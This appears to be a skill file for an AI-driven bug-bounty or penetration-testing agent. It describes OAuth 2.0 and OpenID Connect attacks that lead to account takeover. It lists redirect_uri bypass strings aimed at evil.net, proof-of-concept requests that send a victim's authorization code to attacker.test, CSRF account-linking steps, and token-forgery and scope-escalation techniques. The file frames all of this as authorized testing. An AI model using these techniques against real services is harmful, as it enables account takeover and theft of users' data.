---
name: oauth
description: "OAuth 2.0 / OIDC flaws -> account takeover — redirect_uri bypass, code/token leakage, missing/weak state (CSRF account linking), implicit-grant forgery, scope flaws, unverified-email ATO. Use for 'Login with Google/Facebook', SSO, redirect_uri/state/code/id_token, /authorize, /token, /userinfo."
---

# OAuth 2.0 / OpenID Connect

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Authorization framework abused for authentication. Flaws here are high-signal: a single
parsing quirk or missing `state` often yields full account takeover.

## When to test
- Any "Log in / Sign up with <provider>" button (Google, Facebook, Apple, GitHub, Microsoft).
- Internal/enterprise SSO that speaks OAuth or OIDC.
- "Connect / link your <provider> account" features inside an authenticated app.
- Any request carrying `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `code`,
  or `id_token`. Recon: fetch `/.well-known/openid-configuration` and
  `/.well-known/oauth-authorization-server`.

## Impact & priority (honest)
- redirect_uri leak of `code`/`token` + active victim session -> **account takeover. P1/P2.**
- Missing/weak `state` on the account-link callback -> CSRF forces victim's account to link the
  attacker's social profile -> attacker logs in as victim. **P2.**
- Unverified-email registration at provider -> register victim's email -> log into client as
  victim. **P1/P2.**
- Stolen implicit `access_token` accepted without `client_id`/binding check -> ATO. **P2.**
- These are full-auth-bypass bugs; treat a working PoC as top of queue.

## Detection (map the flow first)
1. Capture the full round trip: `/authorize` request -> consent -> callback -> client's
   token-handling POST (implicit) or back-channel `/token` (auth code).
2. Note `response_type`: `code` (auth code, back-channel exchange) vs `token`/`id_token`
   (implicit, token in URL fragment).
3. `redirect_uri`: how strictly is it validated? Try appended path, extra params, second
   `redirect_uri`, alternate host. See reference.md.
4. `state`: present? Unguessable? Tied to the session? Replayable across users? Absent = CSRF.
5. Token handling: for implicit, does the client's session-establishing POST re-validate the
   token belongs to the submitted user/`client_id`, or does it trust client-supplied fields?

## Exploitation
- **redirect_uri -> code/token exfil:** point `redirect_uri` to attacker host (or a leaky page on
  the whitelisted domain). Send the crafted `/authorize` link to a logged-in victim; the
  `code`/`token` lands in your callback or leaks via `Referer`/open redirect. With an auth code
  and an active victim session you do **not** need the client secret.
- **Missing/weak state -> CSRF account linking:** initiate the link flow as the attacker, capture
  the callback URL containing *your* `code`, drop the `state`, and deliver that callback to the
  victim. Their account links your social identity; you then "Log in with <provider>" as them.
- **Implicit token forgery:** if the client POSTs `{email, token}` to establish a session and
  doesn't verify the token matches the email/`client_id`, swap in the victim's email.
- **Flawed scope / email verification:** at `/token` or `/userinfo`, add `scope` the user never
  consented to; if upgraded -> broken scope validation. Trust of an unverified `email` claim ->
  ATO via attacker-registered account using the victim's email.
- **OIDC extras:** unauthenticated dynamic client registration; `request_uri` SSRF and
  query-validation bypass via JWT-embedded params. See reference.md.

## Common bypasses (redirect_uri parsing)
`https://allowed.com.evil.net`, `https://evil.net/allowed.com`, `https://allowed.com@evil.net`,
`https://allowed.com&@evil.net#@x.evil.net/`, path traversal
`/callback/../../evil`, `localhost.evil.net`, duplicate `redirect_uri` params (HPP), open-redirect
chaining off a whitelisted domain. Full matrix and OIDC specifics in **reference.md**.

## Minimal PoC (log to ./_EXPLOIT/)
Keep it minimal and safe — use only accounts and a callback host you control.

Code exfil via redirect_uri:
```
# 1. Crafted authorize link delivered to a logged-in VICTIM (your test account #2):
GET /authorize?client_id=CLIENT&response_type=code
    &redirect_uri=https://attacker.test/cb&scope=openid%20email&state=xyz HTTP/1.1
Host: oauth-provider.target.com

# 2. Provider redirects victim's browser, code lands on YOUR host:
GET /cb?code=LEAKED_CODE&state=xyz HTTP/1.1
Host: attacker.test

# 3. Prove takeover: exchange LEAKED_CODE at the client (active victim session, no secret needed),
#    or POST it to the client's callback to obtain victim's authenticated session.
```

Forced account-link CSRF (missing state):
```
# Attacker (account #1) starts "link Google", captures callback holding attacker's code:
GET /oauth/link/callback?code=ATTACKER_CODE HTTP/1.1   <- no state param

# Deliver this URL to VICTIM (account #2) while logged in -> victim's account now linked to
# attacker's Google identity. Attacker then "Login with Google" -> lands in victim's account.
```
Log to `./_EXPLOIT/`: target, exact requests, the two controlled accounts used, the leaked
`code`/`token` (redacted), and proof of cross-account access.

## Chain for impact
OAuth flaws are an ATO pipeline — chain the steps:
- **`redirect_uri` manipulation / open redirect → leak `code`/`token` → account takeover.**
- **id_token is a JWT?** hand off to `/jwt` (algorithm confusion, `none`, weak secret) to forge identity.
- **Missing/weak `state` → CSRF account-linking** (`/csrf`) → attacker-controlled login → ATO.
- Once you hold the victim session, use `/access-control-idor` to reach their data/admin functions. Write up via `/reporting`.

## Don't report as noise
- Missing `state` where the callback performs **no** sensitive/stateful action (pure login that
  re-prompts, no linking) and no ATO is demonstrable.
- redirect_uri "bypass" that only reaches another path on the *same* trusted origin with no leak
  primitive (no open redirect / XSS / Referer leak) — show the leak or it's theoretical.
- Reflected/echoed tokens with no cross-account or session impact. Prove takeover or drop it.

## Deep reference
See **reference.md** (grant types, full flow, client/service vulns, redirect_uri attack matrix,
OIDC specifics, prevention).
- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/oauth/openid
- https://portswigger.net/web-security/oauth/preventing
